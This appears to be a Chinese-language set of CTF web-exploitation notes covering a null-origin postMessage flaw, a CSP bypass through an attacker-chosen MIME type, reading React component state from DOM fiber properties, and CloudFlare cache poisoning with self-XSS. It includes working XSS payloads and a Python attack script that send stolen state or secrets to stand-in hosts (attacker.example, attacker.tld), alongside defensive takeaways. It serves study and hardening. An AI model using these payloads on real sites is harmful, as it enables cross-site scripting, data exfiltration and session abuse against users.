**要点：** `data:` URI iframe 的源是 `null`。很多 postMessage 处理器只检查 `event.origin !== expected`，没考虑 null 源，于是可从沙箱上下文注入。不带 `allow-same-origin` 的 `sandbox` 属性同样产生 `null` 源。始终用 `data:` URI 或沙箱 iframe 以 `null` 源测试 postMessage 处理器。修复方式是显式拒绝 null 和空源：`if (!event.origin || event.origin === 'null') return;`。

---

<a id="csp-bypass-via-attacker-controlled-mime-type-for-same-origin-scripts-midnight-sun-ctf-finals-2018"></a>
## 借攻击者可控 MIME 类型加载同源脚本绕过 CSP（Midnight Sun CTF Finals 2018）

**模式（Mimisbrunnr）：** 端点 `/xss?xss=<payload>&mimis=<mime>` 以攻击者选定的 `Content-Type` 回显 `payload`。CSP 为 `script-src 'self'` 且设置了 `X-Content-Type-Options: nosniff`，正常 XSS 注入被拦截。但选择 `mimis=application/javascript`（或 Chrome 宽松的 `jscript`）后，这个同源响应就能通过 `<script src="/xss?...&mimis=jscript">` 作为脚本加载。

**利用：**
```html
<!-- Served by attacker's XSS injection point (another endpoint on the same origin) -->
<script src="/xss?xss=function%20WELCOME(){};var%20oooooo=0;/*&mimis=jscript"></script>
<script src="/xss?xss=*/payload;//&mimis=jscript"></script>
```
- 第一个请求夹带了无害 token，并开启块注释（`/*`）。
- 第二个请求闭合注释（`*/`）并运行真正的 payload。
- 因为两个响应都来自 `self`，`script-src 'self'` 得到满足——尽管在没有 `nosniff` 的情况下浏览器通常会因 MIME 类型不符而拒绝它们。

**要点：** `X-Content-Type-Options: nosniff` 能阻止 MIME 嗅探，但无法推翻服务器自己声明的 Content-Type。任何响应类型由攻击者控制的端点——哪怕是间接地通过查询参数或 `Accept` 头——在 `script-src 'self'` 下都等同于一个脚本 gadget。防御方法是：对反射型端点硬编码 `Content-Type`，绝不把用户输入回显进响应头。

**参考：** Midnight Sun CTF Finals 2018 — writeup 10258

---

<a id="react-component-state-extraction-via-__reactinternalinstance-rctf-2018"></a>
## 通过 __reactInternalInstance$ 提取 React 组件状态（RCTF 2018）

**模式：** React 渲染页面上的 XSS 无法直接读取服务端状态，但 React 管理的每个 DOM 节点都带有一个名为 `__reactInternalInstance$<random>` 的属性，指回 React Fiber 节点。由此可用 `.return.stateNode.state`（新版本中为 `.memoizedState`）读出从未序列化进 HTML 的组件状态。

**外带 payload：**
```javascript
const key = Object.keys(document.querySelector('[data-react-root]'))
  .find(k => k.startsWith('__reactInternalInstance$'));
const fiber = document.querySelector('[data-react-root]')[key];
const state = fiber.return.stateNode.state;
fetch('https://attacker.example/log?s=' + encodeURIComponent(JSON.stringify(state)));
```

React 17+ 的属性名是 `__reactFiber$<random>`，路径为 `.stateNode.memoizedState`。沿 `.return` 向上遍历，直到遇到 `stateNode !== null` 的节点。

**要点：** 为支持热重载和 DevTools，React 把组件状态挂在 DOM 本身上。因此同一文档内的 XSS 能完整读取 props 和 state，包括客户端拉取、从未回显到标记里的数据（认证 token、私聊、管理面板）。加固方式：生产构建中剥离 `__reactFiber$`/`__reactInternalInstance$` 挂载，或从上游消除 XSS——仅靠 CSP 不够，因为读取状态用的是 CSP 本就允许的 JavaScript。

**参考：** RCTF 2018 — writeup 10125

---

<a id="cloudflare-cache-poisoning-via-js-username--stored-self-xss-confidence-2019-teaser"></a>
## 借 .js 用户名 + 存储型 self-XSS 投毒 CloudFlare 缓存（CONFidence 2019 Teaser）

**模式：** 个人资料页存在存储型 self-XSS（例如在 `<select>` 的 `shoesize` 字段上通过 `tabindex=1 contenteditable autofocus onfocus=...` 做属性注入）。单靠 self-XSS 没用——它只对资料所有者触发。CDN 按 URL 扩展名而不是 `Content-Type` 缓存，于是注册一个 URL 以 `.js` 结尾的用户名，就能让 CDN 把 `/profile/<user>.js` 当作可缓存的静态 JS 资源。攻击者自己会话的一次已登录访问即可污染共享边缘缓存：之后每个访问者——包括题目的管理机器人——都会拿到攻击者的已认证 HTML，从而在受害者会话下执行该 XSS。

```python
# 1. Pick a region-matching VM so your cache hits land in the admin's region.
#    (CloudFlare is region-sharded; colocate with other challenge infra.)

# 2. Register a user whose name ends in .js
import requests, random
s = requests.Session()
s.get('http://target/login')
user = f'hfs-{random.randint(10**7, 10**8)}.js'
s.post('http://target/login', data=f'login={user}&password={user}',
       headers={'Content-Type': 'application/x-www-form-urlencoded'})

# 3. Store self-XSS via the shoesize select attribute injection
payload = ('fetch("/profile").then(e=>e.text()).then(f=>'
           'new Image().src="//attacker.tld/?"+/secret(.*)>/.exec(f)[0])')
raw = (
  '------B\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nazz\r\n'
  '------B\r\nContent-Disposition: form-data; name="shoesize"\r\n\r\n'
  f'1 tabindex=1 contenteditable autofocus onfocus={payload}\r\n'
  '------B\r\nContent-Disposition: form-data; name="secret"\r\n\r\nasd\r\n'
  '------B--\r\n'
)
s.post(f'http://target/profile/{user}', data=raw,
       headers={'Content-Type': 'multipart/form-data; boundary=----B'})

# 4. Poison the edge cache: fetch once while logged in
s.get(f'http://target/profile/{user}')

# 5. Report the profile to the admin bot -> cached (authenticated) HTML is served
#    to the admin, XSS fires, attacker.tld logs ?secret=<flag>
```

**要点：** CDN 按 URL 路径/扩展名缓存，而不是按响应的 `Content-Type` 或 `Vary: Cookie`；`.js`（或 `.css`、`.svg`、`.ico`、`.png`）后缀常常把按用户生成的页面变成全局共享的静态资源，从而把 self-XSS 升级为可蠕虫化的存储型 XSS。始终测试：追加常见静态扩展名后，未认证访问是否返回**同样的**已认证内容——那就是投毒原语。CloudFlare 后面的管理机器人题目尤其脆弱；一旦污染，管理员下一次访问就会带着他们的 Cookie 执行你的 payload。

**参考：** CONFidence CTF 2019 Teaser — Web 50，writeup 13925。背景阅读：[PortSwigger: Practical Web Cache Poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)。
